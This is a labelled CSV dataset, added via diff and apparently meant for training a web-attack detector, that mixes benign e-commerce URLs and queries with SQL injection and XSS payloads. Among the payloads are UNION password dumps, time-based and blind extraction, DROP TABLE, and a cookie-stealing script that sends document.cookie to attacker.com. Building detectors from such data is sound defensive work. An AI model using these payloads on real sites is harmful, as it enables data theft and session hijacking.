@@ -1,0 +1,2401 @@
+text,label,threat_type
+filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+about-us,0,NORMAL
+login?user=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+usb c cable 2m,0,NORMAL
+terms-and-conditions,0,NORMAL
+"<object data=""javascript:alert(1)"">",2,XSS
+product?id=102&category=electronics,0,NORMAL
+api/search?term=usb+c+cable+2m,0,NORMAL
+filter=1' ORDER BY 2--+,1,SQL_INJECTION
+admin'/*,1,SQL_INJECTION
+filter?category=usb+c+cable+2m&sort=desc,0,NORMAL
+redirect=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+filter?category=catalog?page=2&sort=price_asc&sort=desc,0,NORMAL
+"<video><source onerror=""javascript:alert(1)"">",2,XSS
+search?q=admin_user_2024,0,NORMAL
+search?q=<svg/onload=alert('XSS')>,2,XSS
+help/return-policy,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+"search?q=""><script>alert(document.domain)</script>",2,XSS
+filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
+best headphones under 100,0,NORMAL
+search?q=help/return-policy,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+assets/css/main.css,0,NORMAL
+<input autofocus onfocus=alert(1)>,2,XSS
+query=order/status?tracking=FEDEX-889922&page=1,0,NORMAL
+item/cart/checkout?step=billing?ref=homepage,0,NORMAL
+search?q=apple+macbook+pro+m2,0,NORMAL
+search?q=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+search?q=download/specs-datasheet.pdf,0,NORMAL
+search?q=<input autofocus onfocus=alert(1)>,2,XSS
+' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+api/search?term=alice.smith@example.com,0,NORMAL
+browse?tag=assets/js/bundle.min.js,0,NORMAL
+comment=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+login?user=' OR '1'='1,1,SQL_INJECTION
+query=apple+macbook+pro+m2&page=1,0,NORMAL
+login?user=1' ORDER BY 1--+,1,SQL_INJECTION
+browse?tag=index.html,0,NORMAL
+api/search?term=reviews?rating=5&verified=true,0,NORMAL
+query=cart/add?item_id=554&qty=1&page=1,0,NORMAL
+comment=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+comment=<select autofocus onfocus=alert(1)>,2,XSS
+item/api/v1/users?limit=10&offset=20?ref=homepage,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+"comment=<object data=""javascript:alert(1)"">",2,XSS
+assets/css/main.css,0,NORMAL
+login?user=' HAVING 1=1 --,1,SQL_INJECTION
+<svg/onload=alert('XSS')>,2,XSS
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+<script>alert('XSS')</script>,2,XSS
+"<object data=""javascript:alert(1)"">",2,XSS
+api/search?term=usb+c+cable+2m,0,NORMAL
+browse?tag=assets/js/bundle.min.js,0,NORMAL
+"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+search?q=admin_user_2024,0,NORMAL
+"""><script>alert(document.domain)</script>",2,XSS
+search?q=<svg/onload=alert('XSS')>,2,XSS
+1; DROP TABLE users--,1,SQL_INJECTION
+"<video><source onerror=""javascript:alert(1)"">",2,XSS
+1' ORDER BY 3--+,1,SQL_INJECTION
+best headphones under 100,0,NORMAL
+search?q=mechanical+pencil+0.5mm,0,NORMAL
+query=profile/edit?name=Johnathan&page=1,0,NORMAL
+"comment=""><script>alert(document.domain)</script>",2,XSS
+filter?category=profile/edit?name=Johnathan&sort=desc,0,NORMAL
+search?q=john_doe,0,NORMAL
+api/search?term=product?id=102&category=electronics,0,NORMAL
+filter?category=cart/add?item_id=554&qty=1&sort=desc,0,NORMAL
+api/search?term=blog/post-10-cybersecurity-tips,0,NORMAL
+catalog?page=2&sort=price_asc,0,NORMAL
+dashboard?view=summary,0,NORMAL
+api/v1/users?limit=10&offset=20,0,NORMAL
+search?q=search?q=mechanical+pencil+0.5mm,0,NORMAL
+"search?q=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+product?id=102&category=electronics,0,NORMAL
+"comment=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+<details open ontoggle=alert(1)>,2,XSS
+search?q=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+contact,0,NORMAL
+search?q=<body onload=alert('XSS')>,2,XSS
+query=contact&page=1,0,NORMAL
+order/status?tracking=FEDEX-889922,0,NORMAL
+"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+assets/js/bundle.min.js,0,NORMAL
+item/search?q=mechanical+pencil+0.5mm?ref=homepage,0,NORMAL
+item?id=1' ORDER BY 1--+,1,SQL_INJECTION
+search?q=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+<img src=x onerror=alert('XSS')>,2,XSS
+item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+filter=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+search?q=apple+macbook+pro+m2,0,NORMAL
+login?user=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
+') or ('1'='1'--,1,SQL_INJECTION
+SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+filter?category=admin_user_2024&sort=desc,0,NORMAL
+search?q=dashboard?view=summary,0,NORMAL
+1' ORDER BY 2--+,1,SQL_INJECTION
+item?id=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+index.html,0,NORMAL
+api/search?term=cart/checkout?step=billing,0,NORMAL
+wireless mouse,0,NORMAL
+search?q=dashboard?view=summary,0,NORMAL
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+view_order?order_id=983214,0,NORMAL
+filter?category=catalog?page=2&sort=price_asc&sort=desc,0,NORMAL
+"<object data=""javascript:alert(1)"">",2,XSS
+"search?q=""><script>alert(document.domain)</script>",2,XSS
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
+search?q=cart/add?item_id=554&qty=1,0,NORMAL
+settings?theme=dark&lang=en,0,NORMAL
+"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+search?q=alice.smith@example.com,0,NORMAL
+' or 1=1/*,1,SQL_INJECTION
+filter=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+' HAVING 1=1 --,1,SQL_INJECTION
+filter?category=about-us&sort=desc,0,NORMAL
+filter?category=assets/js/bundle.min.js&sort=desc,0,NORMAL
+' HAVING 1=1 --,1,SQL_INJECTION
+query=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+filter?category=checkout?shipping=standard&promo=WELCOME10&sort=desc,0,NORMAL
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+search?q=about-us,0,NORMAL
+item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
+' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+1; DROP TABLE users--,1,SQL_INJECTION
+order/status?tracking=FEDEX-889922,0,NORMAL
+query=best+headphones+under+100&page=1,0,NORMAL
+shoes for running,0,NORMAL
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+"search?q=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+admin' #,1,SQL_INJECTION
+"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+"item?id=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+search?q=mechanical+pencil+0.5mm,0,NORMAL
+item/help/return-policy?ref=homepage,0,NORMAL
+' HAVING 1=1 --,1,SQL_INJECTION
+filter=1' AND SLEEP(10)--,1,SQL_INJECTION
+browse?tag=apple+macbook+pro+m2,0,NORMAL
+<svg onload=alert(1)>,2,XSS
+api/search?term=alice.smith@example.com,0,NORMAL
+filter?category=password123!&sort=desc,0,NORMAL
+api/search?term=profile/edit?name=Johnathan,0,NORMAL
+<details open ontoggle=alert(1)>,2,XSS
+search?q=index.html,0,NORMAL
+filter?category=download/specs-datasheet.pdf&sort=desc,0,NORMAL
+"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+query=<img src=x onerror=alert('XSS')>,2,XSS
+search?q=admin'/*,1,SQL_INJECTION
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+item?id=' OR 1=1 --,1,SQL_INJECTION
+' HAVING 1=1 --,1,SQL_INJECTION
+browse?tag=faq/shipping-times,0,NORMAL
+profile/edit?name=Johnathan,0,NORMAL
+filter=1' ORDER BY 2--+,1,SQL_INJECTION
+newsletter/subscribe?email=user@test.org,0,NORMAL
+login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
+reviews?rating=5&verified=true,0,NORMAL
+browse?tag=wireless+mouse,0,NORMAL
+browse?tag=gaming+monitor,0,NORMAL
+assets/js/bundle.min.js,0,NORMAL
+browse?tag=reviews?rating=5&verified=true,0,NORMAL
+python programming book,0,NORMAL
+apple macbook pro m2,0,NORMAL
+' HAVING 1=1 --,1,SQL_INJECTION
+' or 1=1/*,1,SQL_INJECTION
+api/search?term=python+programming+book,0,NORMAL
+query=account/security/2fa-setup&page=1,0,NORMAL
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+account/security/2fa-setup,0,NORMAL
+query=account/security/2fa-setup&page=1,0,NORMAL
+item/about-us?ref=homepage,0,NORMAL
+search?q=<body onload=alert('XSS')>,2,XSS
+admin_user_2024,0,NORMAL
+search?q=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+browse?tag=python+programming+book,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+john_doe,0,NORMAL
+newsletter/subscribe?email=user@test.org,0,NORMAL
+"""><script>alert(document.domain)</script>",2,XSS
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+search?q=<svg onload=alert(1)>,2,XSS
+blog/post-10-cybersecurity-tips,0,NORMAL
+search?q=spring+sale+discount,0,NORMAL
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+admin'/*,1,SQL_INJECTION
+filter=1' ORDER BY 3--+,1,SQL_INJECTION
+"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+item?id=1; DROP TABLE users--,1,SQL_INJECTION
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+api/search?term=products/audio/bluetooth-speakers,0,NORMAL
+search?q=spring+sale+discount,0,NORMAL
+api/search?term=laptop,0,NORMAL
+<script>alert('XSS')</script>,2,XSS
+redirect=<script>alert(1)</script>,2,XSS
+api/search?term=alice.smith@example.com,0,NORMAL
+query=cart/add?item_id=554&qty=1&page=1,0,NORMAL
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+api/search?term=privacy-policy,0,NORMAL
+"login?user="" OR ""1""=""1",1,SQL_INJECTION
+"redirect=""><script>alert(document.domain)</script>",2,XSS
+cotton t-shirt blue,0,NORMAL
+download/specs-datasheet.pdf,0,NORMAL
+shoes for running,0,NORMAL
+api/v1/users?limit=10&offset=20,0,NORMAL
+filter=' OR '1'='1,1,SQL_INJECTION
+mechanical keyboard,0,NORMAL
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+comment=<script>alert(1)</script>,2,XSS
+browse?tag=products/audio/bluetooth-speakers,0,NORMAL
+search?q=<details open ontoggle=alert(1)>,2,XSS
+search?q=4k+oled+television+lg,0,NORMAL
+cart/checkout?step=billing,0,NORMAL
+SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+1; DROP TABLE users--,1,SQL_INJECTION
+browse?tag=shoes+for+running,0,NORMAL
+"redirect=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+search?q=assets/js/bundle.min.js,0,NORMAL
+""" OR ""1""=""1",1,SQL_INJECTION
+reviews?rating=5&verified=true,0,NORMAL
+comment='><script>alert('PWNED')</script>,2,XSS
+api/v1/users?limit=10&offset=20,0,NORMAL
+password123!,0,NORMAL
+alice.smith@example.com,0,NORMAL
+search?q=spring+sale+discount,0,NORMAL
+"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+<img src=x onerror=alert('XSS')>,2,XSS
+item?id=' HAVING 1=1 --,1,SQL_INJECTION
+gaming monitor,0,NORMAL
+redirect=<marquee onstart=alert(1)>,2,XSS
+<img src=x onerror=alert('XSS')>,2,XSS
+query=search?q=4k+oled+television+lg&page=1,0,NORMAL
+"query=""><script>alert(document.domain)</script>",2,XSS
+index.html,0,NORMAL
+"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+"redirect=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+<img src=x onerror=alert('XSS')>,2,XSS
+<script>alert(1)</script>,2,XSS
+"query=<object data=""javascript:alert(1)"">",2,XSS
+privacy-policy,0,NORMAL
+index.html,0,NORMAL
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+query=<select autofocus onfocus=alert(1)>,2,XSS
+search?q=index.html,0,NORMAL
+password123!,0,NORMAL
+comment=<isindex type=image src=1 onerror=alert(1)>,2,XSS
+search?q=1; DROP TABLE users--,1,SQL_INJECTION
+') or ('1'='1'--,1,SQL_INJECTION
+redirect=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+search?q=4k+oled+television+lg,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+<body onload=alert('XSS')>,2,XSS
+query=newsletter/subscribe?email=user@test.org&page=1,0,NORMAL
+api/search?term=cotton+t-shirt+blue,0,NORMAL
+query=privacy-policy&page=1,0,NORMAL
+browse?tag=dashboard?view=summary,0,NORMAL
+"""><script>alert(document.domain)</script>",2,XSS
+api/v1/users?limit=10&offset=20,0,NORMAL
+admin_user_2024,0,NORMAL
+"query=<video><source onerror=""javascript:alert(1)"">",2,XSS
+search?q=' OR 'a'='a,1,SQL_INJECTION
+redirect=<marquee onstart=alert(1)>,2,XSS
+newsletter/subscribe?email=user@test.org,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+' OR '1'='1,1,SQL_INJECTION
+search?q=spring+sale+discount,0,NORMAL
+') or ('1'='1'--,1,SQL_INJECTION
+redirect=<input autofocus onfocus=alert(1)>,2,XSS
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+query=blog/post-10-cybersecurity-tips&page=1,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+<svg/onload=alert('XSS')>,2,XSS
+login?user=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+blog/post-10-cybersecurity-tips,0,NORMAL
+account/security/2fa-setup,0,NORMAL
+search?q=api/v1/users?limit=10&offset=20,0,NORMAL
+cotton t-shirt blue,0,NORMAL
+query=shoes+for+running&page=1,0,NORMAL
+profile/edit?name=Johnathan,0,NORMAL
+mechanical keyboard,0,NORMAL
+shoes for running,0,NORMAL
+<details open ontoggle=alert(1)>,2,XSS
+item/api/v1/users?limit=10&offset=20?ref=homepage,0,NORMAL
+"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+1' ORDER BY 3--+,1,SQL_INJECTION
+filter=' HAVING 1=1 --,1,SQL_INJECTION
+cotton t-shirt blue,0,NORMAL
+download/specs-datasheet.pdf,0,NORMAL
+login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
+item/catalog?page=2&sort=price_asc?ref=homepage,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+terms-and-conditions,0,NORMAL
+') or ('1'='1'--,1,SQL_INJECTION
+dashboard?view=summary,0,NORMAL
+item/dashboard?view=summary?ref=homepage,0,NORMAL
+python programming book,0,NORMAL
+about-us,0,NORMAL
+item/shoes+for+running?ref=homepage,0,NORMAL
+login?user=1' ORDER BY 2--+,1,SQL_INJECTION
+search?q=<details open ontoggle=alert(1)>,2,XSS
+checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+products/audio/bluetooth-speakers,0,NORMAL
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+<script>alert('XSS')</script>,2,XSS
+search?q=alice.smith@example.com,0,NORMAL
+comment=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+filter=admin' #,1,SQL_INJECTION
+"filter=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+item/apple+macbook+pro+m2?ref=homepage,0,NORMAL
+query=<svg/onload=alert('XSS')>,2,XSS
+item/cotton+t-shirt+blue?ref=homepage,0,NORMAL
+search?q=<marquee onstart=alert(1)>,2,XSS
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+usb c cable 2m,0,NORMAL
+<marquee onstart=alert(1)>,2,XSS
+"search?q=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+admin_user_2024,0,NORMAL
+contact,0,NORMAL
+"redirect=<video><source onerror=""javascript:alert(1)"">",2,XSS
+search?q=1; DROP TABLE users--,1,SQL_INJECTION
+item?id=' or 1=1#,1,SQL_INJECTION
+<svg/onload=alert('XSS')>,2,XSS
+<svg/onload=alert('XSS')>,2,XSS
+item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
+redirect=<svg onload=alert(1)>,2,XSS
+' or 1=1/*,1,SQL_INJECTION
+search?q=reviews?rating=5&verified=true,0,NORMAL
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+item/gaming+monitor?ref=homepage,0,NORMAL
+item?id=) or ('1'='1,1,SQL_INJECTION
+search?q=gaming+monitor,0,NORMAL
+contact,0,NORMAL
+checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+' HAVING 1=1 --,1,SQL_INJECTION
+item?id=' HAVING 1=1 --,1,SQL_INJECTION
+"search?q=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+query=cotton+t-shirt+blue&page=1,0,NORMAL
+admin_user_2024,0,NORMAL
+filter?category=cart/add?item_id=554&qty=1&sort=desc,0,NORMAL
+"query=""><script>alert(document.domain)</script>",2,XSS
+""" OR ""1""=""1",1,SQL_INJECTION
+item/assets/css/main.css?ref=homepage,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+terms-and-conditions,0,NORMAL
+admin' #,1,SQL_INJECTION
+privacy-policy,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+browse?tag=john_doe,0,NORMAL
+item/search?q=4k+oled+television+lg?ref=homepage,0,NORMAL
+filter=' or 1=1/*,1,SQL_INJECTION
+api/search?term=profile/edit?name=Johnathan,0,NORMAL
+query=<svg/onload=alert('XSS')>,2,XSS
+terms-and-conditions,0,NORMAL
+1' ORDER BY 1--+,1,SQL_INJECTION
+images/banner-sale.jpg,0,NORMAL
+settings?theme=dark&lang=en,0,NORMAL
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+filter?category=dashboard?view=summary&sort=desc,0,NORMAL
+filter?category=admin_user_2024&sort=desc,0,NORMAL
+api/search?term=profile/edit?name=Johnathan,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+"search?q=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+api/search?term=shoes+for+running,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+item?id=1' ORDER BY 3--+,1,SQL_INJECTION
+filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
+<input autofocus onfocus=alert(1)>,2,XSS
+assets/css/main.css,0,NORMAL
+account/security/2fa-setup,0,NORMAL
+<body onload=alert('XSS')>,2,XSS
+"search?q=<video><source onerror=""javascript:alert(1)"">",2,XSS
+home,0,NORMAL
+admin' --,1,SQL_INJECTION
+' or 1=1/*,1,SQL_INJECTION
+api/search?term=search?q=spring+sale+discount,0,NORMAL
+"search?q=""><script>alert(document.domain)</script>",2,XSS
+item/privacy-policy?ref=homepage,0,NORMAL
+search?q=products/audio/bluetooth-speakers,0,NORMAL
+item/newsletter/subscribe?email=user@test.org?ref=homepage,0,NORMAL
+mechanical keyboard,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+"comment=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+order/status?tracking=FEDEX-889922,0,NORMAL
+view_order?order_id=983214,0,NORMAL
+search?q=ergonomic+chair+mesh,0,NORMAL
+laptop,0,NORMAL
+1' ORDER BY 3--+,1,SQL_INJECTION
+search?q=wireless+mouse,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+search?q=' HAVING 1=1 --,1,SQL_INJECTION
+filter?category=wireless+mouse&sort=desc,0,NORMAL
+"redirect=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+login?user=1' ORDER BY 1--+,1,SQL_INJECTION
+redirect=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+gaming monitor,0,NORMAL
+shoes for running,0,NORMAL
+filter?category=newsletter/subscribe?email=user@test.org&sort=desc,0,NORMAL
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+api/search?term=cart/add?item_id=554&qty=1,0,NORMAL
+filter?category=order/status?tracking=FEDEX-889922&sort=desc,0,NORMAL
+best headphones under 100,0,NORMAL
+view_order?order_id=983214,0,NORMAL
+"1' UNION SELECT null, null, null--",1,SQL_INJECTION
+redirect=<body onload=alert('XSS')>,2,XSS
+checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+password123!,0,NORMAL
+search?q=profile/edit?name=Johnathan,0,NORMAL
+query=<select autofocus onfocus=alert(1)>,2,XSS
+"redirect=<object data=""javascript:alert(1)"">",2,XSS
+filter=) or ('1'='1,1,SQL_INJECTION
+browse?tag=dashboard?view=summary,0,NORMAL
+<svg onload=alert(1)>,2,XSS
+<input autofocus onfocus=alert(1)>,2,XSS
+mechanical keyboard,0,NORMAL
+"redirect=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+query=privacy-policy&page=1,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+api/search?term=download/specs-datasheet.pdf,0,NORMAL
+search?q=alice.smith@example.com,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+filter?category=best+headphones+under+100&sort=desc,0,NORMAL
+search?q=spring+sale+discount,0,NORMAL
+admin' #,1,SQL_INJECTION
+"login?user=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+1' ORDER BY 1--+,1,SQL_INJECTION
+item/search?q=ergonomic+chair+mesh?ref=homepage,0,NORMAL
+' HAVING 1=1 --,1,SQL_INJECTION
+search?q=contact,0,NORMAL
+search?q=password123!,0,NORMAL
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+search?q=contact,0,NORMAL
+1' ORDER BY 3--+,1,SQL_INJECTION
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+admin' #,1,SQL_INJECTION
+1' ORDER BY 2--+,1,SQL_INJECTION
+"comment=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+<script>alert('XSS')</script>,2,XSS
+item?id=1' ORDER BY 1--+,1,SQL_INJECTION
+search?q=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+"redirect=<video><source onerror=""javascript:alert(1)"">",2,XSS
+john_doe,0,NORMAL
+query=<svg/onload=alert('XSS')>,2,XSS
+query=laptop&page=1,0,NORMAL
+filter?category=cart/add?item_id=554&qty=1&sort=desc,0,NORMAL
+search?q=<script>alert(1)</script>,2,XSS
+profile/edit?name=Johnathan,0,NORMAL
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+login?user=' OR '1'='1,1,SQL_INJECTION
+search?q=apple+macbook+pro+m2,0,NORMAL
+"search?q=<object data=""javascript:alert(1)"">",2,XSS
+browse?tag=assets/css/main.css,0,NORMAL
+login?user=%27%20OR%201%3D1%20--,1,SQL_INJECTION
+"search?q=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+search?q=1' AND SLEEP(10)--,1,SQL_INJECTION
+catalog?page=2&sort=price_asc,0,NORMAL
+"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+query=<svg/onload=alert('XSS')>,2,XSS
+browse?tag=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+assets/css/main.css,0,NORMAL
+api/search?term=mechanical+keyboard,0,NORMAL
+"""><script>alert(document.domain)</script>",2,XSS
+<details open ontoggle=alert(1)>,2,XSS
+1; DROP TABLE users--,1,SQL_INJECTION
+search?q=mechanical+keyboard,0,NORMAL
+login?user=' HAVING 1=1 --,1,SQL_INJECTION
+comment=<script>alert(1)</script>,2,XSS
+item/reviews?rating=5&verified=true?ref=homepage,0,NORMAL
+newsletter/subscribe?email=user@test.org,0,NORMAL
+search?q=cart/checkout?step=billing,0,NORMAL
+search?q=search?q=ergonomic+chair+mesh,0,NORMAL
+shoes for running,0,NORMAL
+' OR 1=1 --,1,SQL_INJECTION
+<details open ontoggle=alert(1)>,2,XSS
+newsletter/subscribe?email=user@test.org,0,NORMAL
+browse?tag=assets/css/main.css,0,NORMAL
+item/password123!?ref=homepage,0,NORMAL
+images/banner-sale.jpg,0,NORMAL
+"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+' HAVING 1=1 --,1,SQL_INJECTION
+query=images/banner-sale.jpg&page=1,0,NORMAL
+apple macbook pro m2,0,NORMAL
+browse?tag=apple+macbook+pro+m2,0,NORMAL
+"query=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+login?user=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+item/laptop?ref=homepage,0,NORMAL
+1' ORDER BY 3--+,1,SQL_INJECTION
+"search?q=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+1' ORDER BY 3--+,1,SQL_INJECTION
+query=assets/js/bundle.min.js&page=1,0,NORMAL
+item?id=admin' #,1,SQL_INJECTION
+<svg/onload=alert('XSS')>,2,XSS
+assets/js/bundle.min.js,0,NORMAL
+"<object data=""javascript:alert(1)"">",2,XSS
+search?q=' OR 'a'='a,1,SQL_INJECTION
+admin_user_2024,0,NORMAL
+faq/shipping-times,0,NORMAL
+redirect=<body onload=alert('XSS')>,2,XSS
+cotton t-shirt blue,0,NORMAL
+home,0,NORMAL
+filter?category=john_doe&sort=desc,0,NORMAL
+api/search?term=password123!,0,NORMAL
+login?user=1' ORDER BY 2--+,1,SQL_INJECTION
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+api/v1/users?limit=10&offset=20,0,NORMAL
+"redirect=""><script>alert(document.domain)</script>",2,XSS
+filter=' or 1=1/*,1,SQL_INJECTION
+login?user='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+filter=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+laptop,0,NORMAL
+redirect=<svg onload=alert(1)>,2,XSS
+filter?category=password123!&sort=desc,0,NORMAL
+search?q=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+<body onload=alert('XSS')>,2,XSS
+'><script>alert('PWNED')</script>,2,XSS
+browse?tag=order/status?tracking=FEDEX-889922,0,NORMAL
+filter?category=mechanical+keyboard&sort=desc,0,NORMAL
+<script>alert(1)</script>,2,XSS
+checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+browse?tag=alice.smith@example.com,0,NORMAL
